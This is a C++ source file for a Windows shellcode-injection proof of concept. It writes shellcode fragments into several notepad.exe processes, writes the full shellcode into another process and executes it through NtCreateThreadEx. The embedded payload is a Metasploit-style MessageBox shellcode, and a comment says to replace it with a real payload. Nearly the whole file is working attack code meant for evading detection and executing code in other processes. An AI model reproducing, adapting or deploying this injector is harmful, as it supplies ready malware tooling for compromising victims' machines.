#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

// Simple MessageBox shellcode for PoC (replace with a real payload)
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
"\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
"\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
"\x20\x4d\x53\x46\x21\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65"
"\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9"
"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0"
"\xb5\xa2\x56\xff\xd5";

size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // Split the shellcode into 3 parts

std::vector<DWORD> processList;

// Function to find target processes (example: "notepad.exe")
DWORD FindProcessID(const wchar_t* processName) {
    DWORD processID = 0;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processEntry)) {
        do {
            char procName[260] = { 0 };
            size_t convertedChars = 0;
            wcstombs_s(&convertedChars, procName, processEntry.szExeFile, _TRUNCATE);

            if (_stricmp(procName, "notepad.exe") == 0) {
                processID = processEntry.th32ProcessID;
                processList.push_back(processID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processID;
}

// Function to inject shellcode fragments into different processes
bool InjectFragment(DWORD pid, unsigned char* fragment, size_t fragmentSize, LPVOID& remoteAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    remoteAddress = VirtualAllocEx(hProcess, NULL, fragmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddress) return false;

    WriteProcessMemory(hProcess, remoteAddress, fragment, fragmentSize, NULL);

    std::cout << "[+] Fragment injected into PID " << pid << " at address: 0x" << remoteAddress << std::endl;

    CloseHandle(hProcess);
    return true;
}

// Function to reconstruct and execute the shellcode in a target process
void ExecuteShellcode(DWORD pid, LPVOID remoteAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    // Get pointer to NtCreateThreadEx
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        std::cout << "[-] Error obtaining NtCreateThreadEx\n";
        return;
    }

    HANDLE hThread;
    NTSTATUS status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, remoteAddress, NULL, FALSE, 0, 0, 0, NULL);

    if (status == 0) {
        std::cout << "[+] Shellcode successfully executed in process PID: " << pid << std::endl;
    }
    else {
        std::cout << "[-] Failed to execute shellcode. NTSTATUS: " << std::hex << status << std::endl;
    }

    CloseHandle(hProcess);
}

int main() {
    // Find available processes for injection
    FindProcessID(L"notepad.exe");

    if (processList.size() < numParts + 1) {
        std::cout << "[-] Insufficient number of target processes. Open more instances of Notepad!" << std::endl;
        return -1;
    }

    size_t partSize = shellcodeSize / numParts;
    std::vector<LPVOID> allocatedAddresses;

    std::cout << "[*] Injecting shellcode fragments...\n";
    for (int i = 0; i < numParts; i++) {
        LPVOID remoteAddress = NULL;
        DWORD targetPID = processList[i];

        if (!InjectFragment(targetPID, shellcode + (i * partSize), partSize, remoteAddress)) {
            std::cout << "[-] Injection failed in process " << targetPID << std::endl;
            return -1;
        }

        allocatedAddresses.push_back(remoteAddress);
        std::cout << "[+] Fragment " << i + 1 << " injected into PID: " << targetPID << std::endl;
    }

    // Choose a final process to reconstruct the shellcode
    DWORD finalProcessPID = processList[numParts];
    LPVOID finalAddress = VirtualAllocEx(OpenProcess(PROCESS_ALL_ACCESS, FALSE, finalProcessPID),
        NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    std::cout << "[*] Reconstructing the shellcode...\n";
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, finalProcessPID);
    for (int i = 0; i < numParts; i++) {
        WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)finalAddress + (i * partSize)),
            shellcode + (i * partSize), partSize, NULL);
    }
    CloseHandle(hProcess);

    std::cout << "[*] Executing shellcode in final process: " << finalProcessPID << "\n";
    ExecuteShellcode(finalProcessPID, finalAddress);

    return 0;
}
